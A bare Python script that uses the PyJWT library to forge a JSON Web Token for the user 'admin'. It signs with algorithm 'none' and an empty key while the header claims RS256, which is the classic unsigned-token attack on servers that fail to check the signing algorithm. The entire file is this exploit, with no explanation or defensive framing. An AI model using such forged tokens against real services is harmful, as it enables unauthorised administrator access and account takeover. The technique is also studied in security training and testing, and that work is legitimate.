import jwt
Payload = {
    "username":"admin"
}
headers = {
    "alg": "RS256",
    "typ": "JWT"
}
json_web_token = jwt.encode(payload=Payload, key="",
                            algorithm="none", headers=headers)
print(json_web_token)
